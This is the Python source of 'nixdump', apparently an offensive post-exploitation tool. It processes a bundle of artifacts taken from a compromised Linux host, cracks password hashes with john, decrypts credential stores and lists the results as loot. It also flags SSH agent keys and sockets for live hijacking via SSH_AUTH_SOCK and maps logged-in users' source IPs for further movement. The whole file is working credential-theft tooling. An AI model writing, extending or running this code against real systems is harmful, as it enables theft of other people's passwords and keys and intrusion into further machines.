#!/usr/bin/env python3
"""nixdump - Linux credential looter, offline processor.

Two stages:
  1) target:  sh nixdump.sh           -> one .tar.gz bundle of raw artifacts
              (pure POSIX sh, needs nothing, runs on any box)
  2) your VM: python3 nixdump.py BUNDLE.tar.gz
              parse everything, crack hashes (john), decrypt stores, one table.

  python3 nixdump.py bundle.tgz
  python3 nixdump.py bundle.tgz --json          # also write loot.json/csv dir
  python3 nixdump.py bundle.tgz --no-crack      # skip john (fast, hashes only)
  python3 nixdump.py bundle.tgz --only shadow,ssh
"""
from __future__ import annotations

import argparse
import os
import re
import sys
import tarfile
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import reporter, tools                              # noqa: E402
from core.secret import Secret, Status                        # noqa: E402
from core.tools import which                                  # noqa: E402
from core.cracker import default_wordlist                     # noqa: E402
from collectors import ALL_COLLECTORS                          # noqa: E402

OUT_DIR = "nixdump_loot"        # default export folder (used with --json/--csv)


def build_args() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="nixdump - Linux credential looter (offline processor)",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("archive", nargs="?", help="bundle (.tar.gz) made by nixdump.sh")
    p.add_argument("--json", action="store_true", help="export loot.json")
    p.add_argument("--csv", action="store_true", help="export loot.csv")
    p.add_argument("--no-crack", action="store_true",
                   help="do NOT run john; just dump hashes uncracked (fast)")
    p.add_argument("--wordlist", help="wordlist for cracking (default: rockyou)")
    p.add_argument("--only", help="comma list of collectors to run (see --list)")
    p.add_argument("--skip", help="comma list of collectors to skip")
    p.add_argument("--list", action="store_true", help="list collectors and exit")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def select(only, skip):
    chosen = list(ALL_COLLECTORS)
    if only:
        keys = {k.strip().lower() for k in only.split(",")}
        chosen = [c for c in chosen if c.name.lower() in keys]
    if skip:
        keys = {k.strip().lower() for k in skip.split(",")}
        chosen = [c for c in chosen if c.name.lower() not in keys]
    return chosen


_IP_RE = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")


def _agent_findings(meta_dir) -> list:
    """meta/ssh_agent.txt -> clean INFO findings: agent keys (hijackable LIVE on
    the box, never in the bundle), agent sockets, logged-in users with the IP
    they came from, and inbound SSH source IPs. Raw `w`/`ss` output is parsed
    down to (user, ip) / peer-ip instead of dumping whole lines."""
    try:
        with open(os.path.join(meta_dir, "ssh_agent.txt"), errors="ignore") as fh:
            lines = fh.read().splitlines()
    except OSError:
        return []
    out, section, seen = [], "", set()
    for ln in lines:
        s = ln.strip()
        if s.startswith("## "):
            section = s[3:].lower(); continue
        if not s or s.startswith("<"):
            continue

        if ("ssh-add" in section or "keys loaded" in section) and re.search(r"SHA256:|MD5:|^\d{3,4} ", s):
            if ("key", s[:80]) in seen:
                continue
            seen.add(("key", s[:80]))
            out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
                              secret_type="agent-key",
                              notes="key loaded in a target agent; hijack LIVE via SSH_AUTH_SOCK"))

        elif "agent sockets" in section and "agent." in s:
            if ("sock", s) in seen:
                continue
            seen.add(("sock", s))
            out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
                              secret_type="agent-sock",
                              notes="agent socket on target (owner = whose agent)"))

        # logged-in users: who + w output -> (user, source-ip)
        elif "came from" in section:
            low = s.lower()
            if "load average" in low or low.startswith("user ") or low.startswith("user\t"):
                continue                      # skip w's uptime line and column header
            parts = s.split()
            m = _IP_RE.search(s)
            if not parts or not m:
                continue
            user, ip = parts[0], m.group(1)
            if ("login", user, ip) in seen:
                continue
            seen.add(("login", user, ip))
            out.append(Secret("SSH-Agent", user, ip, Status.INFO,
                              secret_type="login-src", target=ip,
                              notes="logged-in user and the source IP they came from"))

        # established inbound ssh (ss/netstat): peer IP is the loot
        elif "inbound ssh" in section:
            ips = _IP_RE.findall(s)
            if not ips:
                continue
            peer = ips[-1]                    # ss prints local (:22) first, peer last
            if ("inbound", peer) in seen:
                continue
            seen.add(("inbound", peer))
            out.append(Secret("SSH-Agent", "", peer, Status.INFO,
                              secret_type="inbound-ssh", target=peer,
                              notes="established inbound SSH connection (source IP)"))
    return out


def main() -> int:
    args = build_args().parse_args()
    reporter.print_banner()

    if args.list:
        for c in ALL_COLLECTORS:
            print(f"  {c.name.lower():<12} {c.description}")
        return 0

    if not args.archive:
        print("[!] usage: nixdump.py BUNDLE.tar.gz  (make it on the target with nixdump.sh)",
              file=sys.stderr)
        return 2
    if not os.path.isfile(args.archive):
        print(f"[!] archive not found: {args.archive}", file=sys.stderr)
        return 2

    # extract the bundle and point the collectors at it
    tmp = tempfile.mkdtemp(prefix="nixdump-")
    try:
        with tarfile.open(args.archive) as tf:
            try:
                tf.extractall(tmp, filter="data")      # py3.12+ safe extract
            except TypeError:
                tf.extractall(tmp)
    except Exception as e:
        print(f"[!] failed to extract bundle: {e}", file=sys.stderr)
        return 2
    tools.set_root(os.path.join(tmp, "root"))
    meta_dir = os.path.join(tmp, "meta")

    man = os.path.join(meta_dir, "manifest.txt")
    if os.path.isfile(man):
        with open(man, errors="ignore") as fh:
            for ln in fh:
                print(f"    {ln.rstrip()}", file=sys.stderr)

    crack = not args.no_crack
    if crack and not which("john"):
        print("[!] john not found; hashes will be dumped uncracked (or use --no-crack)",
              file=sys.stderr)
        crack = False

    # --- live progress UI (green, like the windows tool) ---
    console = status = None
    try:
        from rich.console import Console
        console = Console(stderr=True)
        status = console.status("[bold green]starting...", spinner="line")
        status.start()
    except Exception:
        console = None

    def line(msg):
        (console.print(msg, highlight=False) if console else print(msg, file=sys.stderr))

    def active(msg):
        if status:
            status.update(f"[bold green]{msg}")

    opts = {"crack": crack, "wordlist": args.wordlist, "verbose": args.verbose,
            "meta_dir": meta_dir, "status_cb": active}

    results, seen = [], set()
    try:
        for Col in select(args.only, args.skip):
            active(f"looting  {Col.name}")
            try:
                got = Col(opts).collect()
            except Exception as e:
                line(f"   {Col.name:<12} error: {e}")
                continue
            added = 0
            for s in got:
                if s.key() in seen:
                    continue
                seen.add(s.key()); results.append(s); added += 1
            mark = f"[green]{added:>3}[/green]" if (console and added) else f"{added:>3}"
            line(f"   {Col.name:<12} {mark} finding(s)")

        for s in _agent_findings(meta_dir):
            if s.key() not in seen:
                seen.add(s.key()); results.append(s)
    finally:
        if status:
            status.stop()

    print()
    reporter.render_table(results)
    if args.json or args.csv:
        reporter.export(results, OUT_DIR, args.json, args.csv)
        print(f"\n[*] exports written under {OUT_DIR}/", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
